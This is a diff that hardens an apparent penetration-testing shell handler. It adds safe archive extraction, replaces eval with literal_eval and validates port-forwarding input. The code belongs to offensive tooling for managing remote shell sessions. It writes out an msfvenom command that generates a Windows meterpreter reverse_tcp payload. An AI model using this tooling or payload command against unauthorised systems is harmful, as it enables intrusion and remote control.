@@ -22,6 +22,7 @@ import os
 import io
 import re
 import sys
+import ast
 import pwd
 import tty
 import ssl
@@ -71,10 +72,27 @@ from string import ascii_letters
 from random import choice, randint
 rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
 caller = lambda: inspect.stack()[2].function
-bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
+def bdebug(file, data):
+	with open("/tmp/" + file, "a") as f:
+		f.write(repr(data) + "\n")
 chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
 pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
 normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
+
+def safe_tar_extractall(tar, dest):
+	dest_real = os.path.realpath(dest)
+	for member in tar.getmembers():
+		member_path = os.path.realpath(os.path.join(dest, member.name))
+		if not member_path.startswith(dest_real + os.sep) and member_path != dest_real:
+			logging.warning(f"Skipping tar entry with path traversal: {member.name}")
+			continue
+		if member.issym():
+			link_target = os.path.realpath(os.path.join(os.path.dirname(member_path), member.linkname))
+			if not link_target.startswith(dest_real + os.sep) and link_target != dest_real:
+				logging.warning(f"Skipping symlink pointing outside destination: {member.name}")
+				continue
+		member.mode |= 0o200
+		tar.extract(member, dest)
 
 def Open(item, terminal=False):
 	if not terminal:
@@ -222,7 +240,8 @@ class Interfaces:
 
 class Table:
 
-	def __init__(self, list_of_lists=[], header=None, fillchar=" ", joinchar=" "):
+	def __init__(self, list_of_lists=None, header=None, fillchar=" ", joinchar=" "):
+		list_of_lists = list_of_lists if list_of_lists is not None else []
 		self.list_of_lists = list_of_lists
 
 		self.joinchar = joinchar
@@ -409,14 +428,16 @@ class PBar:
 	def terminate(self):
 		if self.queue and current_thread() != self.trace_thread: self.queue.join(); self.queue.put(None)
 		if hasattr(__class__, 'render_lock'): __class__.render_lock.acquire()
-		if not self: return
-		self.active = False
-		if hasattr(self, 'eta'): del self.eta
-		if not any(__class__.pbars):
-			self.render()
-			print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
-			__class__.pbars.clear()
-		if hasattr(__class__, 'render_lock'): __class__.render_lock.release()
+		try:
+			if not self: return
+			self.active = False
+			if hasattr(self, 'eta'): del self.eta
+			if not any(__class__.pbars):
+				self.render()
+				print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
+				__class__.pbars.clear()
+		finally:
+			if hasattr(__class__, 'render_lock'): __class__.render_lock.release()
 
 
 class paint:
@@ -661,7 +682,7 @@ class BetterCMD:
 		Reset the local terminal
 		"""
 		if shutil.which("reset"):
-			os.system("reset")
+			subprocess.run(["reset"])
 		else:
 			cmdlogger.error("'reset' command doesn't exist on the system")
 
@@ -797,10 +818,11 @@ class MainMenu(BetterCMD):
 				f"{session_part}{paint('>').cyan_DIM} "
 		)
 
-	def session_operation(current=False, extra=[]):
+	def session_operation(current=False, extra=None):
 		def inner(func):
 			@wraps(func)
 			def newfunc(self, ID):
+				extra_ = extra if extra is not None else []
 				if current:
 					if not self.sid:
 						if core.sessions:
@@ -812,7 +834,7 @@ class MainMenu(BetterCMD):
 					if ID:
 						if ID.isnumeric() and int(ID) in core.sessions:
 							ID = int(ID)
-						elif ID not in extra:
+						elif ID not in extra_:
 							cmdlogger.warning("Invalid session ID")
 							return False
 					else:
@@ -1057,9 +1079,14 @@ class MainMenu(BetterCMD):
 
 		elif arrow == '<-':
 			_type = 'R'
+			rhost = "127.0.0.1"
+			rport = None
 
 			if group2:
 				rhost, rport = group2.split(':')
+			else:
+				cmdlogger.warning("Remote endpoint is required for reverse forwarding")
+				return False
 
 			if group1:
 				lhost, lport = group1.split(':')
@@ -1067,7 +1094,27 @@ class MainMenu(BetterCMD):
 				cmdlogger.warning("At least local port is required")
 				return False
 
-		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))
+			if rport is None:
+				rport = lport
+
+		if not re.fullmatch(r'[a-zA-Z0-9._:\[\]-]+', rhost):
+			cmdlogger.warning("Invalid remote host")
+			return False
+
+		if not re.fullmatch(r'[a-zA-Z0-9._:\[\]-]+', lhost):
+			cmdlogger.warning("Invalid local host")
+			return False
+
+		try:
+			rport = int(rport)
+			lport = int(lport)
+			if not (1 <= rport <= 65535) or not (1 <= lport <= 65535):
+				raise ValueError
+		except (ValueError, TypeError):
+			cmdlogger.warning("Ports must be integers between 1 and 65535")
+			return False
+
+		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=rport)
 
 	@session_operation(current=True)
 	def do_download(self, remote_items):
@@ -1513,7 +1560,7 @@ class MainMenu(BetterCMD):
 						value = dumps(value, indent=4)
 					print(f"{paint(value).yellow}")
 				else:
-					new_value = eval(args[1])
+					new_value = ast.literal_eval(args[1])
 					old_value = getattr(options, param)
 					setattr(options, param, new_value)
 					if getattr(options, param) != old_value:
@@ -2360,6 +2407,7 @@ class Session:
 			self.tty = self.get_tty(silent=silent)
 
 	def get_shell_pid(self):
+		response = None
 		if self.OS == 'Unix':
 			response = self.exec("echo $$", agent_typing=True, value=True)
 
@@ -2388,11 +2436,11 @@ class Session:
 		try:
 			if self.OS == 'Unix':
 				if self.agent:
-					if not eval(self.exec(
+					if self.exec(
 						f"stdout_stream << str(os.access(normalize_path('{directory}'), os.W_OK)).encode()",
 						python=True,
 						value=True
-					)):
+					) != 'True':
 						logger.error(f"{directory}: Permission denied")
 						return False
 				else:
@@ -3010,13 +3058,13 @@ class Session:
 			return self.subchannel.result
 
 	def need_binary(self, name, url):
-		options = (
+		menu_text = (
 			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
 			f"\n  2) Upload local {name} binary"
 			f"\n  3) Specify remote {name} binary path"
 			 "\n  4) None of the above\n"
 		)
-		print(paint(options).magenta)
+		print(paint(menu_text).magenta)
 		answer = ask("Select action: ")
 
 		if answer == "1":
@@ -3469,18 +3517,10 @@ class Session:
 				logger.error("Invalid data returned")
 				return []
 
-			def add_w(func):
-				def inner(*args, **kwargs):
-					args[0].mode |= 0o200
-					func(*args, **kwargs)
-				return inner
-
-			tar._extract_member = add_w(tar._extract_member)
-
 			with warnings.catch_warnings():
 				warnings.simplefilter("ignore", category=DeprecationWarning)
 				try:
-					tar.extractall(local_download_folder)
+					safe_tar_extractall(tar, str(local_download_folder))
 				except Exception as e:
 					logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
 			tar.close()
@@ -3575,8 +3615,13 @@ class Session:
 			downloaded = set()
 			try:
 				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
+					dest_real = os.path.realpath(str(local_download_folder))
 					for item in zipdata.infolist():
 						item.filename = item.filename.replace('\\', '/')
+						member_path = os.path.realpath(os.path.join(str(local_download_folder), item.filename))
+						if not member_path.startswith(dest_real + os.sep) and member_path != dest_real:
+							logger.warning(f"Skipping zip entry with path traversal: {item.filename}")
+							continue
 						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
 						newpath = Path(zipdata.extract(item, path=local_download_folder))
 
@@ -4137,7 +4182,6 @@ class Session:
 					).blue)
 				return session.spawn()
 			return True
-		return False
 
 	def kill(self):
 		if self not in core.rlist:
@@ -4969,15 +5013,16 @@ class meterpreter(Module):
 			arch = ''
 			if session.arch == "x64-based_PC":
 				arch = 'x64/'
-			payload_creation_cmd = (
-				f'BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile '
-				f'/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec '
-				f'/opt/tools/metasploit-framework/msfvenom '
-				f'-p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}'
-			)
+			payload_creation_cmd = [
+				'/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle', 'exec',
+				'/opt/tools/metasploit-framework/msfvenom',
+				'-p', f'windows/{arch}meterpreter/reverse_tcp', f'LHOST={host}', f'LPORT={port}', '-f', 'exe'
+			]
+			payload_env = {**os.environ, 'BUNDLE_GEMFILE': '/opt/tools/metasploit-framework/Gemfile'}
 			logger.info("Creating payload...")
-			print(payload_creation_cmd)
-			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+			print(' '.join(payload_creation_cmd))
+			with open(payload_path, 'wb') as payload_file:
+				result = subprocess.run(payload_creation_cmd, env=payload_env, stdout=payload_file, stderr=subprocess.PIPE)
 
 			if result.returncode == 0:
 				logger.info("Payload created!")
@@ -5383,7 +5428,7 @@ def listener_menu():
 				for listener in core.listeners.values():
 					print(listener.payloads(), end='\n\n')
 			elif command == '\x0C':
-				os.system("clear")
+				subprocess.run(["clear"])
 			elif command in ('q', '\x03'):
 				func = core.stop
 				menu.stop = True
@@ -5403,11 +5448,16 @@ def listener_menu():
 def load_rc():
 	RC = Path(options.basedir / "peneloperc")
 	try:
+		rc_stat = RC.stat()
+		if rc_stat.st_mode & 0o177:
+			os.chmod(RC, 0o600)
+			logger.warning(f"Fixed permissions on {RC} (was too open)")
 		with open(RC, "r") as rc:
 			exec(rc.read(), globals())
 	except FileNotFoundError:
-		RC.touch()
-	os.chmod(RC, 0o600)
+		RC.touch(mode=0o600)
+	except Exception:
+		os.chmod(RC, 0o600)
 
 def emojis_installed():
 	if myOS == "Darwin":
